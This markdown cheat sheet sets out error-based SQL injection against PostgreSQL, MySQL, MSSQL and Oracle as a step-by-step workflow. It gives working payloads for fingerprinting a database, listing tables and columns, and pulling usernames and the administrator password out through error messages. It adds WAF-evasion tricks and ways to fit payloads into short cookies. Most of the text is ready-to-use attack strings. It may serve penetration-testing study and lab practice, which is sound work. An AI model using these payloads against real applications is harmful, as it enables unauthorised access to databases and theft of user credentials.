# Visible Error-Based SQL Injection — Full Workflow

---

## What It Is

The app returns **database error messages** in the response. These error messages aren't just noise — they can leak actual data. By forcing a **type conversion error**, you make the DB include the value it failed to convert inside the error message itself. One query = one leaked value.

This is the fastest extraction method when it works — full strings per request, no character-by-character guessing.

---

## Step 1: Identify Injection Point

```
'       ← triggers an error? injectable
''      ← error disappears? input is concatenated into SQL
'--     ← error disappears? comment closes the rest of the query
```

If the error message leaks the full SQL query, you can see exactly how your input is embedded.

---

## Step 2: Identify the Database

Inject a deliberate type mismatch and read the error format:

| DB         | Test Payload | Error Contains |
|------------|-------------|----------------|
| PostgreSQL | `' AND CAST('a' AS int)--` | `invalid input syntax for type integer: "a"` |
| MySQL      | `'` | `You have an error in your SQL syntax` |
| MSSQL      | `' AND 1=CONVERT(int,'a')--` | `Conversion failed when converting the varchar value` |
| Oracle     | `'` | `ORA-01756: quoted string not properly terminated` |

---

## Step 3: Understand the Technique

The core trick: force the DB to convert a string value to an integer. The conversion fails, and the error message includes the string value.

### PostgreSQL
```
' AND 1=CAST((SELECT version()) AS int)--
```
Error: `invalid input syntax for type integer: "PostgreSQL 14.x on x86_64..."`

The value between the quotes = your extracted data.

### MySQL
```
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
```
Error: `XPATH syntax error: '~8.0.x'`

### MSSQL
```
' AND 1=CONVERT(int,(SELECT @@version))--
```
Error: `Conversion failed when converting the nvarchar value 'Microsoft SQL Server...' to data type int`

### Oracle
```
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## Step 4: Enumerate Tables

### PostgreSQL
```
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS int)--
```
Increment `OFFSET` to iterate: 0, 1, 2, 3...

> **Shorter alternative:** `' AND 1=CAST((SELECT relname FROM pg_class LIMIT 1) AS int)--`
> Use `pg_class` / `pg_tables` when the cookie or parameter has a character limit.

### MySQL
```
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--
```

### MSSQL
```
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

### Oracle
```
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE rownum=1))--
```

---

## Step 5: Enumerate Columns

### PostgreSQL
```
' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) AS int)--
```

### MySQL
```
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)))--
```

### MSSQL
```
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
```

---

## Step 6: Extract Data

### PostgreSQL
```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
```

### MySQL
```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='administrator')))--
```
> **MySQL truncation:** `extractvalue` output is limited to ~32 chars. For longer values, use `SUBSTRING(password,1,32)` and `SUBSTRING(password,33,32)`.

### MSSQL
```
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='administrator'))--
```

### Oracle
```
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE username='administrator'))--
```

---

## Key Gotchas

- **`LIMIT 1` is required** — subqueries in error-based extraction must return exactly one row. Without it you get "subquery returned more than one row" instead of your data.
- **Cookie character limits** — if injecting into a cookie, replace the original value with something short (e.g. `x`) to save space for your payload.
- **Output truncation** — some error messages truncate long values. Extract in chunks with `SUBSTRING()`.
- **`pg_class` vs `information_schema`** — `pg_class` has shorter table names and saves characters. Use it when space is tight.
- **Oracle catalog views** — `all_tables` and `all_tab_columns` use **UPPERCASE** table names.
- **Error suppression** — if the app catches errors and shows a generic error page, you lose your data channel. Fall back to blind techniques.

---

## Real-World Tips

- **This is the fastest extraction method** — you get full strings per request, not single characters. Always check for error-based before resorting to blind techniques.
- **Verbose vs generic errors:** Many production apps suppress detailed errors. Error-based SQLi is more common in dev/staging environments or misconfigured production systems.
- **Stacking extractions:** Concatenate multiple values in one shot: `CAST((SELECT username||':'||password FROM users LIMIT 1) AS int)`
- **WAF evasion:** If `CAST` is blocked, try `CONVERT`, `::int` (PostgreSQL shorthand), or nested function calls.

---

The mindset: error messages aren't just debugging info — they're a data exfiltration channel.
